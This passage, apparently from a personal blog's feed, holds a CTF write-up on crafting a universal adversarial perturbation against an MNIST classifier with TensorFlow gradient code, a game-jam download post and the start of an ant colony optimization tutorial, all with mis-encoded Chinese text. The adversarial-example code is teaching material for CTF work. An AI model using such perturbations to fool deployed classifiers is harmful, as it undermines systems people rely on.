å°„ï¼Œæ¯”å¦‚æ­¤å¤„çš„mnistæ•°æ®é›†æ˜¯28x28çš„å›¾ç‰‡ï¼Œé‚£å…¶å®å°±æ˜¯é•¿åº¦ä¸º784çš„å‘é‡ï¼Œå‡è®¾æ¨¡å‹æ˜¯fï¼Œé‚£ä¹ˆf(x)å°±æ˜¯æ¨¡å‹å¯¹è¾“å…¥å‘é‡xé¢„æµ‹çš„åˆ†ç±»ç»“æœ</p></li><li><p>å†³ç­–è¾¹ç•Œï¼šå…¶å®åœ¨æˆ‘ä¸ªäººç›®å‰çš„ç†è§£ä¸­ï¼Œå†³ç­–è¾¹ç•Œå…¶å®å°±æŒ‡</p><blockquote><p>åœ¨è¿™ä¸ªé—­åˆçš„è¾¹ç•Œå†…ï¼Œæ‰€æœ‰è½åˆ°è¿™é‡Œé¢çš„f(x)éƒ½ä¼šè¢«åˆ¤å®šä¸ºæŸä¸€ä¸ªåˆ†ç±»</p></blockquote></li></ul><p>æ‰€ä»¥ç°åœ¨å†å›æ¥çœ‹æ–‡ä¸­çš„å›¾ï¼š</p><p><img src="/images/GlobalNoise_Universal.png"></p><p>ä»–æè¿°çš„å…¶å®å°±æ˜¯ï¼š</p><ul><li>åœ¨çº¢ï¼Œç»¿ï¼Œè“ï¼Œä¸‰ä¸ªå†³ç­–è¾¹ç•Œå†…ï¼ˆäºŒç»´æ‰å¹³åŒ–çš„å†³ç­–ç©ºé—´åªæ˜¯ä¸ºäº†æ–¹ä¾¿æ¼”ç¤ºå’Œç†è§£ï¼‰ï¼Œåˆ†åˆ«æœ‰ä¸‰ä¸ªæ ·ç‚¹x1ï¼ˆåœ¨çº¢è‰²è¾¹ç•Œå†…ï¼‰,x2ï¼ˆåœ¨è“è‰²è¾¹ç•Œå†…ï¼‰,x3ï¼ˆåœ¨ç»¿è‰²è¾¹ç•Œå†…ï¼‰</li><li>ä¸ºäº†è§†è§‰ä¸Šæ–¹ä¾¿ç†è§£ï¼ŒæŠŠè¿™ä¸‰ä¸ªç‚¹ä»¥åŠä»–ä»¬çš„å†³ç­–ç©ºé—´é‡åˆåœ¨ä¸€èµ·ï¼ˆåŸæœ¬çš„å†³ç­–ç©ºé—´ç»ä¸€èˆ¬ä¸ä¼šç›¸äº’é‡å ï¼Œå› ä¸ºè¾¹ç•Œä¸Šæ­£æ˜¯é¢„æµ‹ç»“æœæ”¹å˜çš„ä¸´ç•Œå¤„ï¼Œå¦‚æœæœ‰ä¸€ä¸ªæ¨¡å‹å­˜åœ¨å¤ªå¤šè¿™æ ·çš„ä¸´ç•ŒçŠ¶å†µï¼Œé‚£è¯´æ˜ä»–è¿™ä¸ªæ¨¡å‹ä¸å¤ªè¡Œï¼‰</li><li>å¯¹f(x)ï¼Œä½¿ç”¨æ¢¯åº¦ä¸‹é™æ³•ï¼Œè·å–ä¸€ä¸ªnoiseï¼Œè¿™ä¸ªnoiseå¯ä»¥æœ€å¿«åœ°æŠŠx1é€åˆ°çº¢è‰²çš„å†³ç­–è¾¹ç•Œ</li><li>è¿™æ—¶noiseå¯ä»¥æŠŠåŸæœ¬è½åœ¨çº¢è‰²è¿™ä¸ªå†³ç­–ç©ºé—´å†…çš„x1ç›´æ¥é€å‡ºåˆ°å†³ç­–è¾¹ç•Œå¤–å»ï¼Œä½†å¯¹äºè“è‰²å†³ç­–ç©ºé—´ä¸­çš„x2æ¥è¯´åˆ™ä¸å¤ªå¥½è¯´</li><li>æ•…é‡å¤è¿™ä¸€è¿‡ç¨‹ï¼Œä½†x2åº”æ›´æ–°ä¸º<code>x2+=noise</code>ï¼Œå¯¹æ›´æ–°åçš„x2æ±‚ä¸€ä¸ªèƒ½æŠŠx2é€å‡ºå†³ç­–è¾¹ç•Œçš„æ–°noiseï¼Œç„¶åæ›´æ–°noiseä¸º<code>noise+=newNoise</code></li><li>å¯¹x3é‡å¤è¿™ä¸€è¿‡ç¨‹</li></ul><p>è¿™æ ·å°±è·å¾—äº†ä¸€ä¸ªå¯ä»¥æŠŠx1,x2,x3éƒ½é€å‡ºå†³ç­–ç©ºé—´çš„å™ªéŸ³ï¼ˆå½“ç„¶ï¼Œæ±‚è¿™ä¸ªå™ªéŸ³çš„é¡ºåºä¼šå¯¹æœ€ç»ˆå¾—åˆ°çš„å™ªéŸ³æœ‰å½±å“</p><h2 id="å…·ä½“å®ç°"><a href="#å…·ä½“å®ç°" class="headerlink" title="å…·ä½“å®ç°"></a>å…·ä½“å®ç°</h2><h3 id="é¢„å¤„ç†"><a href="#é¢„å¤„ç†" class="headerlink" title="é¢„å¤„ç†"></a>é¢„å¤„ç†</h3><p>åŸé¢˜ä¸­çš„é¢„å¤„ç†æ˜¯è°ƒåº“ç›´æ¥ç”¨çš„æ¥å£ï¼Œæˆ‘å› ä¸ºæ²¡æœ‰æ¥è§¦è¿‡å¤ªå¤šæœºå™¨å­¦ä¹ çš„åº“æ‰€ä»¥æ‰‹åŠ¨å¤„ç†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="keyword">from</span> tensorflow <span class="keyword">import</span> keras</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> numpy.linalg <span class="keyword">import</span> norm</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"></span><br><span class="line">model = keras.models.load_model(<span class="string">&#x27;model.h5&#x27;</span>)</span><br><span class="line">test_set=[<span class="number">13616</span>, <span class="number">4189</span>, <span class="number">3206</span>, <span class="number">51839</span>, <span class="number">30560</span>, <span class="number">45045</span>, <span class="number">51389</span>, <span class="number">59638</span>, <span class="number">10487</span>, <span class="number">5233</span>, <span class="number">48889</span>, <span class="number">10247</span>, <span class="number">1547</span>, <span class="number">3914</span>, <span class="number">44182</span>, <span class="number">9990</span>, <span class="number">26276</span>, <span class="number">28283</span>, <span class="number">52481</span>, <span class="number">46609</span>, <span class="number">18757</span>, <span class="number">26954</span>, <span class="number">26322</span>, <span class="number">18819</span>, <span class="number">29463</span>, <span class="number">34489</span>, <span class="number">51248</span>, <span class="number">53986</span>, <span class="number">25872</span>, <span class="number">42855</span>, <span class="number">49719</span>, <span class="number">31176</span>, <span class="number">38292</span>, <span class="number">48100</span>, <span class="number">52763</span>, <span class="number">3904</span>, <span class="number">46879</span>, <span class="number">9810</span>, <span class="number">51583</span>, <span class="number">39760</span>, <span class="number">21245</span>, <span class="number">13728</span>, <span class="number">33834</span>, <span class="number">23968</span>, <span class="number">28781</span>, <span class="number">33134</span>, <span class="number">35277</span>, <span class="number">18562</span>, <span class="number">21344</span>, <span class="number">8396</span>, <span class="number">36000</span>, <span class="number">43427</span>, <span class="number">24477</span>, <span class="number">36678</span>, <span class="number">56218</span>, <span class="number">32945</span>, <span class="number">17707</span>, <span class="number">36763</span>, <span class="number">611</span>, <span class="number">12668</span>, <span class="number">31312</span>, <span class="number">28053</span>, <span class="number">35696</span>, <span class="number">9876</span>, <span class="number">33329</span>, <span class="number">56107</span>, <span class="number">19929</span>, <span class="number">35636</span>, <span class="number">21704</span>, <span class="number">35807</span>, <span class="number">28645</span>, <span class="number">16522</span>, <span class="number">15192</span>, <span class="number">43890</span>, <span class="number">14710</span>, <span class="number">11805</span>, <span class="number">4754</span>, <span class="number">33660</span>, <span class="number">13270</span>, <span class="number">25465</span>, <span class="number">20267</span>, <span class="number">4141</span>, <span class="number">40391</span>, <span class="number">14287</span>, <span class="number">15545</span>, <span class="number">56458</span>, <span class="number">6121</span>, <span class="number">19663</span>, <span class="number">15709</span>, <span class="number">52825</span>, <span class="number">25933</span>, <span class="number">4091</span>, <span class="number">17861</span>, <span class="number">37773</span>, <span class="number">22450</span>, <span class="number">8669</span>, <span class="number">4447</span>, <span class="number">22022</span>, <span class="number">40046</span>, <span class="number">32738</span>]</span><br><span class="line"></span><br><span class="line">dict_mnist = np.load(<span class="string">&quot;mnist.npz&quot;</span>)</span><br><span class="line">x_train = dict_mnist[<span class="string">&quot;x_train&quot;</span>]</span><br><span class="line">y_train = dict_mnist[<span class="string">&quot;y_train&quot;</span>]</span><br><span class="line">x_test = dict_mnist[<span class="string">&quot;x_test&quot;</span>]</span><br><span class="line">y_test = dict_mnist[<span class="string">&quot;y_test&quot;</span>]</span><br><span class="line">dict_mnist.close()</span><br><span class="line">x_train = np.expand_dims(x_train, axis=<span class="number">3</span>)</span><br><span class="line">x_test = np.expand_dims(x_test, axis=<span class="number">3</span>)</span><br><span class="line"><span class="comment">#normalize</span></span><br><span class="line">x_train = (x_train-np.amin(x_train))/(np.amax(x_train)-np.amin(x_train))</span><br><span class="line">x_test = (x_test-np.amin(x_test))/(np.amax(x_test)-np.amin(x_test))</span><br><span class="line"></span><br><span class="line">test_x_data = []</span><br><span class="line">test_y_data = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> test_set:</span><br><span class="line">    test_x_data.append(x_train[i])</span><br><span class="line">    test_y_data.append(y_train[i])</span><br><span class="line">test_x_data = np.array(test_x_data)</span><br><span class="line">test_y_data = np.array(test_y_data)</span><br><span class="line">test_x_data = test_x_data.astype(np.float32)</span><br><span class="line">test_y_data = test_y_data.astype(np.float32)</span><br></pre></td></tr></table></figure><h3 id="è·å–æ¢¯åº¦"><a href="#è·å–æ¢¯åº¦" class="headerlink" title="è·å–æ¢¯åº¦"></a>è·å–æ¢¯åº¦</h3><p>tensorFlowæä¾›äº†å¾ˆå¥½ç”¨çš„æ±‚æ¢¯åº¦çš„æ¥å£gradientTape</p><blockquote><p>2022/01/16è¡¥å……ï¼šè¿™ä¸ªå‡½æ•°åœ¨ä¹‹å‰å†™wpçš„æ—¶å€™å¯¹æˆ‘æ¥è¯´å°±æ˜¯ä¸€ä¸ªé»‘ç›’ï¼Œå¯¹æ¨¡å‹æ±‚è¾“å…¥çš„æ¢¯åº¦çš„å…·ä½“åŸç†è¯·çœ‹å¼€å¤´æåˆ°çš„æ–°æ–‡ç« </p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetGrad</span>(<span class="params">data, classIndex=-<span class="number">1</span></span>):</span></span><br><span class="line">    <span class="comment"># å½“ classIndex=-1ï¼Œæ±‚æ ·æœ¬åˆ°æœ€è¿‘çš„æœ€é«˜æ¦‚ç‡ç‚¹</span></span><br><span class="line">    <span class="comment"># å½“æŒ‡å®š classIndexï¼Œæ±‚æ ·æœ¬åˆ°æŒ‡å®šçš„classIndexçš„æœ€é«˜æ¦‚ç‡ç‚¹</span></span><br><span class="line">    data = data.reshape(-<span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)</span><br><span class="line">    data = tf.cast(data, tf.float32)</span><br><span class="line">    <span class="keyword">with</span> tf.GradientTape() <span class="keyword">as</span> tape:</span><br><span class="line">        tape.watch(data)</span><br><span class="line">        pred = model(data)</span><br><span class="line">        <span class="comment"># loss = tf.norm(pred, axis=1, ord=2) if classIndex == -1 else pred[0][classIndex]  # æœ‰çš„æ–‡ç« æŠŠlossè¿™ä¹ˆå†™</span></span><br><span class="line">        loss = pred[<span class="number">0</span>][np.argmax(pred)] <span class="keyword">if</span> classIndex == -<span class="number">1</span> <span class="keyword">else</span> pred[<span class="number">0</span>][classIndex]</span><br><span class="line">    grad = tape.gradient(loss, data)</span><br><span class="line">    <span class="keyword">return</span> np.array(grad).reshape(<span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="æ¢¯åº¦ä¸‹é™æ±‚noise"><a href="#æ¢¯åº¦ä¸‹é™æ±‚noise" class="headerlink" title="æ¢¯åº¦ä¸‹é™æ±‚noise"></a>æ¢¯åº¦ä¸‹é™æ±‚noise</h3><p>è¿™æ ·æ±‚å‡ºæ¥çš„noiseé€šå¸¸èƒ½ä»¥æœ€å°çš„Lpå°†æ ·æœ¬é€å‡ºå»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GradDes</span>(<span class="params">data, foolRate=<span class="number">0.5</span>, step=<span class="number">0.05</span>, maxIteration=<span class="number">500</span></span>):</span></span><br><span class="line">    minGrad = <span class="number">0.05</span></span><br><span class="line">    arg = np.argmax(model.predict(data.reshape(-<span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)))</span><br><span class="line">    print(<span class="string">&quot;GetPert init arg : &quot;</span> + <span class="built_in">str</span>(arg))</span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    pert = copy.deepcopy(data / np.inf)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        cnt += <span class="number">1</span></span><br><span class="line">        rate = model.predict(data.reshape(-<span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>) + pert.reshape(-<span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>))[<span class="number">0</span>][arg]</span><br><span class="line">        print(<span class="string">&quot;\r - Iteration : &quot;</span> + <span class="built_in">str</span>(cnt) + <span class="string">&quot; rate : &quot;</span> + <span class="built_in">str</span>(rate), end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> rate &lt; foolRate <span class="keyword">or</span> cnt == maxIteration:</span><br><span class="line">            result = model.predict(data.reshape(-<span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>) + pert.reshape(-<span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>))[<span class="number">0</span>]</span><br><span class="line">            print(<span class="string">&quot;\n - pert result : &quot;</span> + <span class="built_in">str</span>(np.argmax(result)) + <span class="string">&quot; : &quot;</span> + <span class="built_in">str</span>(np.amax(result)))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        grad = GetGrad(data + pert)</span><br><span class="line">        <span class="keyword">if</span> norm(grad) &lt; minGrad:</span><br><span class="line">            <span class="keyword">if</span> norm(grad) == <span class="number">0</span>:</span><br><span class="line">                print(<span class="string">&quot;ERROR: grad is zero&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            grad *= minGrad / norm(grad)</span><br><span class="line">        pert -= grad * step</span><br><span class="line">    <span class="keyword">return</span> pert</span><br></pre></td></tr></table></figure><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><p>è¿™æ ·æ±‚ç®—æ•°å¹³å‡å€¼å¾—æ–¹æ³•å…¶å®æœ‰ç‚¹é—®é¢˜ï¼Œå¦‚æœæ°å¥½æœ‰ä¸€ä¸ªåå‘çš„pertï¼Œé‚£ä¸ç›´æ¥æŠµæ¶ˆå“©ï¼Œè€Œä¸”æˆ‘ç”¨åˆ°çš„æ ·æœ¬é‡Œé¢è¿˜æœ‰ä¸€ä¸ªæ˜¯ä¸€å¼€å§‹æœ¬æ¥å°±è¢«åˆ†ç±»å™¨è¯¯åˆ†ç±»çš„ç‚¹= =â€¦ä½†æ˜¯æ—¢ç„¶ä»–å¾—å‡ºçš„ç»“æœèƒ½ç”¨é‚£å°±å…ˆåœ¨è¿™é‡Œè¿™ä¹ˆå†™ï¼Œç„¶åå†è®¨è®ºæ›´å¥½çš„è§£æ³•å—¯</p><p>ç”¨äº†ç®—æ•°å¹³å‡å€¼æ¥æ±‚noiseï¼Œæ²¡æœ‰é²æ£’æ€§</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pert = [<span class="number">0</span>] * <span class="number">6</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    pert[i] = GradDes(test_x_data[np.argwhere(test_y_data == <span class="number">9</span>)[i][<span class="number">0</span>]])</span><br><span class="line">    pert[i] = GradDes(test_x_data[np.argwhere(test_y_data == <span class="number">7</span>)[i][<span class="number">0</span>]] + pert[i])</span><br><span class="line">    pert[<span class="number">2</span> * i] = GradDes(test_x_data[np.argwhere(test_y_data == <span class="number">7</span>)[<span class="number">2</span> * i][<span class="number">0</span>]])</span><br><span class="line">    pert[<span class="number">2</span> * i] = GradDes(test_x_data[np.argwhere(test_y_data == <span class="number">9</span>)[<span class="number">2</span> * i][<span class="number">0</span>]] + pert[<span class="number">2</span> * i])</span><br><span class="line">pertSum = pert[<span class="number">0</span>]/np.inf</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> pert:</span><br><span class="line">    pertSum += i</span><br><span class="line">pert = pertSum/<span class="number">6</span></span><br></pre></td></tr></table></figure><h2 id="expä¼˜åŒ–"><a href="#expä¼˜åŒ–" class="headerlink" title="expä¼˜åŒ–"></a>expä¼˜åŒ–</h2><p>ç›®å‰çš„æƒ³æ³•æ˜¯ï¼šæœ€å¥½æ˜¯é€šè¿‡æ±‚ï¼šå°†æ ·æœ¬å¸¦åˆ°ä¸åŒçš„è¾¹ç•Œçš„noiseï¼ˆæ¯”å¦‚æœ¬é¢˜ä¸­å°±æ˜¯æ±‚å‡ºå°†æ ·æœ¬7å’Œ9å¸¦åˆ°0,1,2,3,4,5,6,8çš„noiseï¼‰ï¼Œç„¶åæ¯”è¾ƒè¿™äº›noiseåœ¨æ–¹å‘ä¸èŒƒæ•°ä¸Šçš„å·®å¼‚ï¼Œè·å¾—æœ€ä¼˜çš„noiseï¼Œæ­¤æ—¶æ±‚ç®—æ•°å¹³å‡å€¼å°±æ²¡æœ‰é—®é¢˜äº†</p><p>ä½†æ˜¯åœ¨å…·ä½“å®ç°ä¸Šé‡åˆ°çš„é—®é¢˜å°±æ˜¯ï¼šåœ¨æ¢¯åº¦ä¸Šå‡æ±‚noiseçš„æ—¶å€™ä¼šé™·å…¥å±€éƒ¨æœ€ä¼˜è§£ï¼ˆå°¤å…¶æ˜¯ç›¸å·®è¾ƒå¤§çš„classï¼‰ï¼Œç„¶åç›®å‰è™½ç„¶çŸ¥é“ä»€ä¹ˆé€€ğŸ”¥é—ä¼ ğŸœç¾¤å•¥çš„ï¼Œä½†è¿˜æ²¡æœ‰æƒ³è¿‡å…·ä½“åˆ°åº•æ€ä¹ˆå¼„</p><p>ä½†ï¼šå¯¹æ¯ä¸€ä¸ªclasséƒ½æ±‚ä¸€ä¸ªnoiseï¼Œä½¿å¾—æŸä¸€ç‰¹å®šæ ·æœ¬åç§»åˆ°å…¶ä»–çš„ä»»æ„classæ˜¯å¯è¡Œçš„</p><blockquote><p>2022.4.6è¡¥å……ï¼šæ ¹æ®æœ€è¿‘äº†è§£çš„ä¿¡æ¯çœ‹æ¥ï¼Œé™·å…¥å±€éƒ¨æœ€ä¼˜è§£å¤§éƒ¨åˆ†åŸå› æ˜¯å› ä¸ºå¡åœ¨éç‚¹ï¼Œæ¢æˆæ›´å¥½çš„ä¼˜åŒ–ç®—æ³•ï¼Œå¦‚Adamç­‰å³å¯</p></blockquote><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> AI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Uncertainty download available!</title>
      <link href="2021/11/17/Uncertainty/"/>
      <url>2021/11/17/Uncertainty/</url>
      
        <content type="html"><![CDATA[<p>Welcome to BadAperture.Incï¼</p><p><img src="/images/Uncertainty_cover.png"></p><span id="more"></span><h1 id="Uncertainty"><a href="#Uncertainty" class="headerlink" title="Uncertainty"></a>Uncertainty</h1><p>Uncertaintyæ˜¯ä¸€æ¬¾ç”±BadApertureå›¢é˜Ÿåœ¨2021NovaGameJamæœŸé—´åˆ¶ä½œçš„æ´»åŠ¨ä½œå“ï¼Œå…¶ä¸­ä¸»è¦åŒ…å«äº†è§£è°œã€è·‘é…·ä¸¤ç§ç±»å‹çš„å…³å¡ï¼Œæ›´å¤šæœ‰å…³ä¿¡æ¯è¯·æ‚¨æŸ¥çœ‹æ¸¸æˆä¸»èœå•ä¸­çš„ABOUTé€‰å¡ï¼</p><blockquote><p>æå–é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1DVbqyM2yhpzKt932_LWzEw">https://pan.baidu.com/s/1DVbqyM2yhpzKt932_LWzEw</a><br>æå–ç ï¼šBDAP</p></blockquote><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>æœ¬ä½œå“ä¸­ä»ç„¶å­˜åœ¨è¯¸å¤šä¸è¶³ï¼Œè¿˜è¯·ç©å®¶å¤šå¤šåŒ…å®¹ï¼Œå¦å¤–ï¼Œç”±äºæ—¶é—´ä¸è¶³ï¼Œæœ¬ä½œä¸åŒ…å«ä»»ä½•éŸ³é¢‘ï¼Œæ–‡å­—éƒ¨åˆ†è¿˜è¯·æ‚¨è€å¿ƒé˜…è¯»ï¼Œå…¶ä¸­ä¹Ÿè®¸åŒ…å«äº†çº¿ç´¢åŠæç¤ºï¼Œæˆ‘ä»¬å¯¹æ‰€æœ‰æœªå¤„ç†å¾—å½“çš„åœ°æ–¹æ·±è¡¨æ­‰æ„</p><p>è¿™æ˜¯æˆ‘ä»¬ç¬¬ä¸€æ¬¡å°è¯•æ¸¸æˆåˆ¶ä½œï¼ˆä¹‹å‰æ˜¯ä¸€å—æ•´éŸ³ä¹çš„ğŸ˜‚ï¼‰ï¼Œä¹‹æ‰€ä»¥ä¼šåœ¨jamä¸­é€‰æ‹©åˆ¶ä½œä¸€ä¸ªå°ä½“é‡çš„3Dæ¸¸æˆï¼Œä¸»è¦è¿˜æ˜¯å› ä¸ºç›¸å¯¹äºæ­£å¸¸çš„gameJamï¼Œä»–ä»¬ç»™çš„æ—¶é—´å®åœ¨æ˜¯å¤ªå¤šäº†ï¼ˆè²Œä¼¼æ˜¯ä¸‰ä¸ªå‘¨ï¼Œç„¶ååœ¨çº¿ä¸‹å±•ç¤ºäº†ä¹‹ååˆç»§ç»­å®Œå–„äº†ä¸€ä¸ªå‘¨ï¼‰ï¼Œäºæ˜¯æˆ‘ä»¬å°±åšå‡ºäº†è¿™ä¹ˆä¸€ä¸ªå¤§èƒ†çš„å°è¯•</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Unity </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Ant Colony Optimization</title>
      <link href="2021/10/02/AntColonyOptimization/"/>
      <url>2021/10/02/AntColonyOptimization/</url>
      
        <content type="html"><![CDATA[<p>èšç¾¤ä¼˜åŒ–ç®—æ³•ï¼Œæœ€ç›´è§‚çš„ä¸€ä¸ªç¤ºä¾‹ç”¨é€”æ˜¯è§£å†³TPSï¼ˆTravelingSealsmanProblemï¼‰é—®é¢˜ï¼Œå¿«é€Ÿå¯»æ‰¾ä¸€ä¸ªå¯è§‚çš„è§£ï¼Œä½†éœ€è¦ä½ è°ƒçš„ä¸€æ‰‹å¥½å‚</p><p><img src="/images/ACO_cover.gif"></p><span id="more"></span><h1 id="Ant-Colony-Optimization"><a href="#Ant-Colony-Optimization" class="headerlink" title="Ant Colony Optimization"></a>Ant Colony Optimization</h1><blockquote><p> èšç¾¤ï¼Œé€€ç«ï¼Œé—ä¼ ï¼Œä¸‰å¤§çŸ¥åä¼˜åŒ–ç®—æ³•</p></blockquote><p>èšç¾¤ä¼˜åŒ–ç®—æ³•ï¼Œå¯å‘åœ¨äºèš‚èšè§…é£Ÿçš„è¡Œä¸ºï¼Œå³ä¸€æ®µæ—¶é—´åèš‚èšèƒ½å¤Ÿæ‰¾åˆ°æœ€çŸ­çš„è·¯å¾„åˆ°è¾¾é£Ÿç‰©çš„ä½ç½®ï¼›æ ¸å¿ƒåœ¨äºå¯¹ä¿¡æ¯ç´ çš„æŠ½è±¡ï¼Œèšç¾¤ç®—æ³•ä¹‹æ‰€ä»¥èƒ½å¤Ÿå¿«é€Ÿä¼˜åŒ–ï¼Œå¾—ç›Šäºç®—æ³•å·²æœ‰çš„æˆæœç§¯ç´¯ï¼›ä¸€å¥è¯è¯´æ˜ç™½è¿™ä¸ªç®—æ³•ï¼Œé‚£å°±æ˜¯åœ¨å½“å‰è§£çš„åŸºç¡€ä¸Šå»å¯»æ‰¾æ›´ä¼˜è§£</p><p>æœ¬æ–‡è®°å½•ä¸€ä¸‹å†™è¿™ä¸ªç®—æ³•çš„unityå¯è§†åŒ–å®ç°è¿‡ç¨‹ï¼Œä½†æ˜¯æˆ‘è¿˜æ˜¯å»ºè®®æ‚¨è‡ªå·±å†™ä¸€éğŸ‘¼ï¼Œä½“éªŒä¸€ä¸‹ä»¤äººéå¸¸ä¸æ„‰å¿«çš„è°ƒå‚ä½“éªŒğŸ’¢ï¼›å¦‚æœä½ å†³å®šè‡ªå·±å†™ä¸€éï¼Œå¯ä»¥åœ¨çœ‹äº†<strong>Getting Start</strong>ç†è§£ç®—æ³•åŸç†åç›´æ¥å¼€å¹²ï¼Œå¡ä½äº†å†æ¥å‚è€ƒä¸€ä¸‹åé¢çš„å…·ä½“å®ç°æ–¹æ³•</p><p>ä¹‹ååº”è¯¥ä¼šå…ˆå»å­¦ä¸€äº›shaderç›¸å…³çš„å†…å®¹ï¼Œä»¥å…åœ¨å¾ˆå¤šä¹‹åæƒ³åšçš„å·¥ç¨‹ä¸­å—é™</p><h2 id="Getting-Start"><a href="#Getting-Start" class="headerlink" title="Getting Start"></a>Getting Start</h2><h3 id="TPS"><a href="#TPS" class="headerlink" title="TPS"></a>TPS</h3><p>æ—…è¡Œå•†äººé—®é¢˜ï¼Œä¸€å¥è¯æ¦‚æ‹¬å°±æ˜¯</p><blockquote><p> æ‰¾åˆ°ä¸€æ¡é•¿åº¦æœ€çŸ­çš„çº¿ä¸²è”èµ·ä¸€äº›å›ºå®šçš„ç‚¹</p></blockquote><p>å‡è®¾æœ‰nä¸ªç‚¹ï¼Œé‚£ä¹ˆå°†æœ‰<code>(n-1)!/2</code>ç§å¯èƒ½æ€§ï¼Œå¦‚æœéå†æ‰€æœ‰ç»“æœï¼Œnç¨å¾®ä¸€å¤§å³åˆ»è®¡ç®—ä¸å¯è¡Œï¼Œèšç¾¤ä¼˜åŒ–ç®—æ³•çš„ä½œç”¨å°±æ˜¯åœ¨çŸ­æ—¶é—´å†…æ‰¾åˆ°ä¸€ä¸ªå¯è§‚çš„è§£ï¼Œè™½ç„¶è¿™ä¸ªè§£ä¸ä¸€å®šä¼šæ˜¯æœ€ä¼˜è§£ï¼Œä½†ç›¸å¯¹äºç®—æ³•æ¶ˆè€—çš„ç®—åŠ›ä¸æ—¶é—´æ¥è¯´æ€§ä»·æ¯”é«˜</p><h3 id="Process-Outline"><a href="#Process-Outline" class="headerlink" title="Process Outline"></a>Process 